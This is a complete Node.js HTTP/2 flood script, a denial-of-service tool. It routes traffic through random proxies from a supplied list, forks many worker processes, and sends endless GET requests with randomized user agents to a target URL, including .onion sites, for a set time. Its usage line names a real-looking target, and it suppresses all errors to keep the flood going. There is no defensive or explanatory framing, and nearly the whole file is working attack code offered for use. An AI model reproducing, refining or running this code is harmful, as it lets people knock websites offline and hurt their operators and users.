"use strict";

const events = require('events');
events.defaultMaxListeners = 0;
const net = require('net');
const tls = require('tls');
var request = require('request');
const dns = require('dns');
const http2 = require('http2');
const UserAgent = require('user-agents');
const cluster = require('cluster');
const fs = require('fs');

if (process.argv.length < 6) {
    console.log('URL Time Threads Proxies');
    console.log('https://sheesh.rip/ 120 5 http.txt');
    process.exit(0);
}

var target = process.argv[2];
var time = process.argv[3];
var threads = process.argv[4];
var proxy2 = process.argv[5];
var proxies = fs.readFileSync(proxy2, 'utf-8').toString().replace(/\r/g, '').split('\x0A');
var proxy3 = proxies[Math.floor(Math.random() * proxies.length)];
const {
  PassThrough
} = require('stream');
const JSStreamSocket = new tls.TLSSocket(new PassThrough())._handle._parentWrap.constructor;
process.on('uncaughtException', () => {}).on('unhandledRejection', () => {});


function run() {
  var proxy = proxies[Math.floor(Math.random() * proxies.length)];
  const parts = proxy.split(':');
  const url = new URL(target);
  let ip = null;
  if (target.indexOf(".onion") != -1) {
    ip = url.hostname;
  } else {
    setInterval(() => {
      dns.lookup(url.hostname, 4, (err, address, family) => {
        ip = address;
      });
    });
  }
  let stats = {};
  setInterval(() => {
    process.send(stats);
    stats = {};
  });
  const intvl = setInterval(() => {
    if (ip == null) return;
    const options = {
      proxy: {
        host: parts[0],
        port: Number(parts[1]),
      },

      command: 'connect',

      destination: {
        host: ip,
        port: url.port == '' ? url.protocol == 'https:' ? 443 : 80 : Number(url.port)
      }
    };
    function connected(info) {
      function sendRequest(socket) {
        http2.connect(`http://${url.host}${url.pathname}`, {
          createConnection: () => socket,
          settings: {
            headerTableSize: 65536,
            maxConcurrentStreams: 1000,
            initialWindowSize: 6291456,
            maxHeaderListSize: 262144,
            enablePush: false
          }
        }, session => {
          session.on('error', () => {});
          function doReq() {
            const userAgentv2 = new UserAgent();
            var useragent = userAgentv2.toString();
            const requestHeaders = Object.assign({
              ':authority': url.host,
              ':method': 'GET',
              ':path': url.pathname,
              ':scheme': url.protocol.substring(0, url.protocol.length - 1)
            }, {
              'user-agent': useragent,
              'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
              'accept-language': 'en-US,en;q=0.9',
              'accept-encoding': 'gzip, deflate, br',
              'x-requested-with': 'XMLHttpRequest',
              'cache-control': 'no-cache',
              'Upgrade-Insecure-Requests': '1'
            });
            try {
              const request = session.request(requestHeaders);
              request.on('error', () => {}).end().on('response', response => {
                if (stats[response[':status']] == null) stats[response[':status']] = 0;
                stats[response[':status']]++;
              });
            } catch {}
          }
          setInterval(() => {
          doReq();
          })
        }).on('error', () => {});
      }
      if (url.protocol == 'https:') {
        const socket = tls.connect({
          rejectUnauthorized: false,
          servername: url.hostname,
          socket: new JSStreamSocket(info.socket),
          secure: true,
          ALPNProtocols: ['h2', 'http1.1']
        }, () => {
          sendRequest(socket);
        }).on('error', () => {});
      } else {
        sendRequest(info.socket);
      }
    }
    const socket = net.connect(options.proxy.port, options.proxy.host, () => {
      socket.once('data', () => connected({
        socket
      }));
      socket.write(Buffer.from(`CONNECT ${options.destination.host}:${options.destination.port} HTTP/1.1\r\nProxy-Connection: keep-alive\r\nHost: ${options.destination.host}\r\n\r\n`, 'binary'));
    }).on('error', () => {});
  });
}
if (cluster.isMaster) {
	 console.log('- bnt loves you <3\n- started');
    for (let i = 0; i < threads; i++) {
        cluster.fork();
    }
} else {
setInterval(run);
	setTimeout(function() {
	  process.exit()
	}, time * 1000);
}